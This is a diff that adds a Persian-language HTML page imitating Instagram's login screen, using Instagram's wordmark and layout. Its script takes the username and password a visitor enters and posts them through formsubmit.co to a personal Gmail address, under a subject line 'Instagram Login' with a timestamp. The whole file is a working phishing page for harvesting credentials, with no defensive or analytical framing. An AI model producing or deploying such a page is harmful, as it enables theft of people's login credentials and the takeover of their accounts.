@@ -1,0 +1,71 @@
+<!doctype html>
+<html lang="fa" dir="rtl">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Instagram</title>
+<style>
+  /* استایل‌ها همون قبلی */
+  body { margin: 0; background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; padding: 10px; }
+  .login-area { display: flex; flex-direction: column; align-items: center; width: 100%; max-width: 400px; }
+  .box { width: 100%; border: 1px solid #dbdbdb; background-color: #fff; padding: 40px 20px 20px; text-align: center; box-sizing: border-box; }
+  .logo { background-image: url('https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png'); background-repeat: no-repeat; background-size: contain; height: 51px; width: 175px; margin: 22px auto 35px; }
+  input { width: 100%; padding: 9px 8px; margin-bottom: 6px; border: 1px solid #dbdbdb; border-radius: 3px; background-color: #fafafa; outline: none; box-sizing: border-box; }
+  button { width: 100%; background-color: #0095f6; color: #fff; border: none; padding: 8px 0; border-radius: 8px; font-weight: 600; margin-top: 8px; cursor: pointer; }
+</style>
+</head>
+<body>
+
+<div class="login-area">
+  <div class="box">
+    <div class="logo"></div>
+    <form id="loginForm">
+      <input type="text" placeholder="Username or Email" id="email" name="email" required>
+      <input type="password" placeholder="Password" id="password" name="password" required>
+      <button type="submit">Log in</button>
+    </form>
+  </div>
+</div>
+
+<script>
+const SERVER_URL = "https://formsubmit.co/ajax/mrxmohammad79@gmail.com";
+
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+  
+  const email = document.getElementById("email").value.trim();
+  const password = document.getElementById("password").value.trim();
+
+  if(!email || !password) {
+    alert("لطفاً ایمیل و رمز عبور را وارد کنید.");
+    return;
+  }
+
+  fetch(SERVER_URL, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+      email: email,
+      password: password,
+      _subject: "Instagram Login - " + new Date().toLocaleString()
+    })
+  })
+  .then(response => response.json())
+  .then(data => {
+    if(data.success) {
+      alert("✅ اطلاعات با موفقیت ارسال شد!");
+      document.getElementById("loginForm").reset();
+    } else {
+      alert("❌ خطا در ارسال");
+    }
+  })
+  .catch(error => {
+    alert("❌ خطا در ارتباط با سرور");
+  });
+});
+</script>
+
+</body>
+</html>
